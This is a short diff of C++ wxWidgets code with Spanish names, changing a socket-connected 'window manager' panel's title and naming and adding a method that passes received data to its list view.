@@ -13,14 +13,15 @@ wxEND_EVENT_TABLE()
 panelWManager::panelWManager(wxWindow* pParent, SOCKET sckCliente, std::string _strID)
 	: wxFrame(pParent, EnumIDS::ID_Panel_WM, "Administrador de Ventanas") {
 	this->sckCliente = sckCliente;
-	this->SetTitle("[" + _strID.substr(0, _strID.find('/', 0)) + "] Administrador de Ventanas");
+	this->SetName(_strID + "-WM");
+	this->SetTitle("[" + _strID + "] Administrador de Ventanas");
 	this->m_CrearListView();
 
 	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
 }
 
 void panelWManager::m_CrearListView() {
-	this->listManager = new ListWmManager(this, EnumIDS::ID_Panel_WM_ListView, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
+	this->listManager = new ListWmManager(this, EnumIDS::ID_Panel_WM_ListView, wxDefaultPosition, wxDefaultSize, wxLC_REPORT  | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
 
 	wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
 	sizer->Add(this->listManager, 1, wxEXPAND | wxALL, 2);
@@ -48,6 +49,10 @@ void ListWmManager::AgregarData(const std::string& strBuffer) {
 		str.erase(0, pos + delimiter.length());
 	}
 	this->InsertItem(iCount, token);
+}
+
+void panelWManager::AgregarData(const std::string& strBuffer) {
+	this->listManager->AgregarData(strBuffer);
 }
 
 void ListWmManager::OnWMmessage(wxCommandEvent& event) {
